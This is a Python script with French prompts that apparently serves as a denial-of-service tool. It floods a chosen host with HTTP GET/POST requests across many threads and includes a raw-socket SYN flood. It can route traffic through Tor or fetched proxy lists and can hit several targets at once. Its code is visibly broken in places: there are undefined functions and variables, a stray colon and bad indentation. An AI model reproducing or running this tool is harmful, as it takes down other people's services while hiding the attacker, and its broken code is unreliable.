import threading
import requests
import time
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from PyRoxy import Proxy
from Sherlock import DownloadFromConfig

def SYN(self) -> None:
        s = None
        with suppress(Exception), socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            while Tools.sendto(s, self._genrate_syn(), self._target):
                continue
        Tools.safe_close(s)

def STRESS(url, stop_time, proxy_str=None):
    session = requests.Session()
    if url.startswith('https'):
        session.verify = False
        session.mount('https://', requests.adapters.HTTPAdapter(
            max_retries=3,
            pool_connections=100,
            pool_maxsize=100
        ))
    
    if proxy_str:
        session.proxies = {"http": proxy_str, "https": proxy_str}
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/json,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
    }
    
    if url.startswith('https'):
        headers["Upgrade-Insecure-Requests"] = "1"
    
    while time.time() < stop_time:
        try:
            r = session.post(url, 
                           headers=headers, 
                           timeout=(10, 30),
                           allow_redirects=True)
            if proxy_str:
                print(f"POST via proxy {proxy_str} - Status: {r.status_code}")
            else:
                print(f"POST sans proxy - Status: {r.status_code}")
        except Exception as e:
            if proxy_str:
                print(f"Erreur POST via proxy {proxy_str}: {e}")
            else:
                print(f"Erreur POST sans proxy: {e}")


def worker(url, stop_time, proxy_str):
    session = requests.Session()
    if proxy_str:
        session.proxies = {"http": proxy_str, "https": proxy_str}
    while time.time() < stop_time:
        try:
            response = session.get(url, timeout=5)
            if proxy_str:
                print(f"Requête envoyée via proxy {proxy_str} - Status: {response.status_code}")
            else:
                print(f"Requête envoyée sans proxy - Status: {response.status_code}")
        except Exception as e:
            if proxy_str:
                print(f"Erreur via proxy {proxy_str}: {e}")
            else:
                print(f"Erreur sans proxy: {e}")


def get_user_inputs():
    proxy_mode = input("Mode proxy (tor/liste/non): ").lower()
    proxy_url = input("URL de la liste de proxys (si mode 'liste'): ") if proxy_mode == "liste" else None
    layer = input("Layer (4/7): ")
    target = input("Cible (hostname/IP): ")
    port = int(input("Port (443 pour HTTPS, 80 pour HTTP): "))
    use_https = input("Utiliser HTTPS? (oui/non): ").lower() == 'oui'
    threads = int(input("Nombre de threads: "))
    duration = int(input("Durée de l'attaque en secondes: "))
    
    return proxy_mode, proxy_url, layer, target, port, use_https, threads, duration
def get_proxies(list_url):
    """Récupère une liste de proxys depuis une URL (une par ligne)."""
    if not list_url:
        return []
    try:
        resp = requests.get(list_url, timeout=10)
        resp.raise_for_status()
        lines = [l.strip() for l in resp.text.splitlines() if l.strip()]
        return lines
    except Exception as e:
        print(f"Impossible de récupérer la liste de proxys: {e}")
        return []


def build_proxies_list(proxy_mode, proxy_url):
    if proxy_mode == "tor":
        return ["socks5h://127.0.0.1:9050"]
    elif proxy_mode == "liste":
        p = get_proxies(proxy_url)
        if not p:
            print("Aucun proxy trouvé.")
        return p or []
    elif proxy_mode == "non":
        return [None]
    else:
        print("Mode proxy inconnu.")
        return []


def run_attack(config):
    """Lance une attaque selon la configuration fournie."""
    proxy_mode = config.get('proxy_mode')
    proxy_url = config.get('proxy_url')
    layer = config.get('layer')
    target = config.get('target')
    port = config.get('port')
    use_https = config.get('use_https')
    threads = config.get('threads')
    duration = config.get('duration')

    PROXIES = build_proxies_list(proxy_mode, proxy_url)
    if not PROXIES:
        # si la liste est vide, on met None pour lancer sans proxy
        PROXIES = [None]

    if layer == "4":
        print(f"[+] Attaque Layer 4 vers {target}:{port}")
        input("Quel methode d'attaque Layer 4 voulez-vous utiliser ? (ex: SYN, TCP, UDP): "):
        if method.upper() == "TCP":
            worker_func = TCP
        elif method.upper() == "UDP":
            worker_func = UDP
        else:
        worker_func = SYN
    elif layer == "7":
        print(f"[+] Attaque Layer 7 vers {target}:{port}")
        worker_func = STRESS
    else:
        print("Layer inconnu, abandon de l'attaque.")
        return

    protocol = "https" if use_https else "http"
    url = f"{protocol}://{target}:{port}"

    stop_time = time.time() + duration
    thread_list = []
    for i in range(threads):
        proxy_str = PROXIES[i % len(PROXIES)]
        t = threading.Thread(target=worker_func, args=(url, stop_time, proxy_str), daemon=True)
        t.start()
        thread_list.append(t)

    try:
        for t in thread_list:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Arrêt demandé par l'utilisateur")


def simultaneous_attacks(targets, base_config):
    """Lance des attaques simultanées : une attaque par target dans `targets`.

    `targets` peut être une liste de hostnames/IP.
    """
    threads = []
    for tgt in targets:
        cfg = base_config.copy()
        cfg['target'] = tgt.strip()
        t = threading.Thread(target=run_attack, args=(cfg,))
        t.start()
        threads.append(t)

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\n[*] Arrêt demandé par l'utilisateur pendant les attaques simultanées.")


def main():
    # récupère la première configuration
    proxy_mode, proxy_url, layer, target, port, use_https, threads, duration = get_user_inputs()
    config = {
        'proxy_mode': proxy_mode,
        'proxy_url': proxy_url,
        'layer': layer,
        'target': target,
        'port': port,
        'use_https': use_https,
        'threads': threads,
        'duration': duration
    }

    while True:
        run_attack(config)
        print("Attaque terminée.")

        choice = input("Que faire ensuite ? (recommencer/changer/simultane/quitter): ").lower().strip()
        if choice in ('recommencer', 'r'):
            print("Relance de la même attaque...")
            continue
        elif choice in ('changer', 'c'):
            print("Saisissez la nouvelle configuration :")
            proxy_mode, proxy_url, layer, target, port, use_https, threads, duration = get_user_inputs()
            config.update({
                'proxy_mode': proxy_mode,
                'proxy_url': proxy_url,
                'layer': layer,
                'target': target,
                'port': port,
                'use_https': use_https,
                'threads': threads,
                'duration': duration
            })
            continue
        elif choice in ('simultane', 's'):
            lst = input("Liste des cibles séparées par des virgules: ")
            targets = [t.strip() for t in lst.split(',') if t.strip()]
            if targets:
                print(f"Lancement de {len(targets)} attaques simultanées...")
                simultaneous_attacks(targets, config)
            else:
                print("Aucune cible fournie.")
            # après simultanées, revenir au menu
            continue
        elif choice in ('quitter', 'q', 'exit'):
            print("Sortie.")
            break
        else:
            print("Option non reconnue, sortie.")
            break


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] Arrêt demandé par l'utilisateur.")
